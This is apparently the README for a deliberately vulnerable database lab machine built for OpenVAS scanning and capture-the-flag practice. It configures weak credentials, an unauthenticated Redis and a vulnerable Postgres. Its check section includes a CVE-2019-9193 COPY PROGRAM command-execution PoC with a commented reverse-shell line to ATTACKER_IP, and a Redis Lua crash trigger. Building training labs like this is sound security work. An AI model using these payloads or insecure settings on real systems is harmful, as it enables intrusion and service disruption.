# 🏢 VulnCorp — Machine 4: rz-db01 (Database Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Deploy target: **192.168.10.101** (lab example; live host may differ, e.g. `192.168.80.37`). SSH runs on the **host**. PostgreSQL and Redis stay in Docker with **`network_mode: host`** so they share the host’s routes (reach other lab machines) and expose version banners on host **`:5432`** / **`:6379`** for OpenVAS. One host MySQL listens on **3306**. There is no second MySQL and no port **2222**. Host MySQL uses **`root` / `root`** so the OpenVAS Community check can log in.

Services OpenVAS can match on this host:

| CVE | Service | Port | Version the check matches |
| --- | --- | --- | --- |
| CVE-2019-9193 | PostgreSQL | 5432 | **11.2** (range 9.3–11.2) |
| CVE-2024-31449 | Redis | 6379 | **7.2.5** (range 7.2.0–7.2.5) |
| CVE-1999-0502 | MySQL | 3306 | Default creds `root` / `root`. Community NVT `1.3.6.1.4.1.25623.1.0.103551` tries empty, `root`, `mysql`, and `password`. It does not try `toor`. |

PostgreSQL and Redis use pinned images. Copy `.env.example` to `.env` and set Postgres passwords before `docker compose up`. Host SSH is on port **22** (root login allowed).

---

## Deploy on the lab host

Copy `machines/rz-db01` to the host (e.g. `/opt/rz-db01` or `/home/debian/rz-db01`). Lab hosts so far are Ubuntu 24.04. Install Docker with `sudo`, then start **Postgres + Redis** from compose.

```bash
sudo apt-get update
sudo apt-get install -y ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu noble stable" | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl enable --now docker

cd /opt/rz-db01
cp .env.example .env
# edit .env (POSTGRES_*), then start postgres + redis:
sudo docker compose up -d --force-recreate postgres redis
sudo docker compose ps
```

Postgres/Redis use **host networking** (no `ports:` mapping). They bind directly on the host. If something else already owns 5432/6379, stop it first. Ubuntu’s own PostgreSQL 16 / redis-server ~7.0.15 will **not** match the CVEs — keep the pinned Docker images (**11.2** / **7.2.5**).

## Verify

```bash
sudo docker inspect -f '{{.State.Health.Status}}' vulncorp-postgres vulncorp-redis
sudo docker exec vulncorp-postgres psql -U vulncorp_user -d vulncorp_prod -c 'select version();'
sudo docker exec vulncorp-redis redis-cli INFO server | head
```

Expected banners: MySQL **8.0.x** with `root` / `root`, PostgreSQL **11.2**, `redis_version:7.2.5`. Scan ports **3306**, **5432**, and **6379** with OpenVAS **Full and fast** and an updated Community feed (include 6379 explicitly; top-1000 can skip it). Keep the Default Accounts family enabled.

---

## 📡 Exposed Ports & Services

| Service | Port | Vulnerability |
|---------|------|---------------|
| **MySQL** (host) | `3306` | Distro **8.0.x**, `root` / `root`, `mysql_native_password`, bound to `0.0.0.0`, SSL off |
| **PostgreSQL** (Docker) | `5432` | Upstream **11.2**, superuser `vulncorp_user` / `vulncorp123`. Last build in the CVE-2019-9193 range OpenVAS matches (9.3 through 11.2) |
| **Redis** (Docker) | `6379` | Upstream **7.2.5** (no password, `protected-mode no`). In the CVE-2024-31449 range OpenVAS matches (fixed in 7.2.6) |
| **SSH** (host) | `22` | OpenSSH root login allowed |

---

## 🔌 Connect & lab checks

Replace `TARGET` with the host IP (e.g. `192.168.80.37` or `192.168.10.101`).

### 1. MySQL — default credentials (OpenVAS Community)

```bash
mysql -h TARGET -u root -proot --ssl=0 -e "SELECT VERSION(), USER();"
```

### 2. PostgreSQL — CVE-2019-9193 (`COPY … PROGRAM`)

Connect (superuser `vulncorp_user` — required for `COPY PROGRAM`):

```bash
psql -h TARGET -U vulncorp_user -d vulncorp_prod
# Password: vulncorp123
```

Confirm version / superuser:

```sql
SELECT version();
SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;
```

Lab PoC (runs OS command as the postgres OS user; lab only):

```sql
COPY (SELECT '') TO PROGRAM 'id';
-- reverse shell example (set ATTACKER_IP / port first):
-- COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
```

Safe no-op check that `COPY PROGRAM` is allowed:

```sql
COPY (SELECT 1) TO PROGRAM 'true';
```

### 3. Redis — CVE-2024-31449

Connect (no password):

```bash
redis-cli -h TARGET
```

Or one-shot:

```bash
redis-cli -h TARGET PING
redis-cli -h TARGET INFO server | grep redis_version
```

Expect `PONG` and `redis_version:7.2.5`.

After connect, CVE-2024-31449 Lua trigger (may **crash** vulnerable Redis — lab only):

```text
EVAL "return bit.tohex(65535, -2147483648)" 0
```

One-liner from the shell:

```bash
redis-cli -h TARGET EVAL "return bit.tohex(65535, -2147483648)" 0
```

OpenVAS matches the **7.2.5** banner in the 7.2.0–7.2.5 range (fixed in 7.2.6). This CVE is an authenticated Lua/`bit.tohex` issue when auth is required; this lab leaves Redis **unauthenticated**, so the same EVAL works after a plain connect. Include port **6379** in the scan.

---

## 🏆 Flags

- **PostgreSQL RCE Flag:** `pg_flag` table (`VULN{pg_rce_4_th3_w1n}`)
- **Root Flag:** `/root/root.txt` (`VULN{db_s3rv3r_r00t3d_m4ch1n3_4}`)
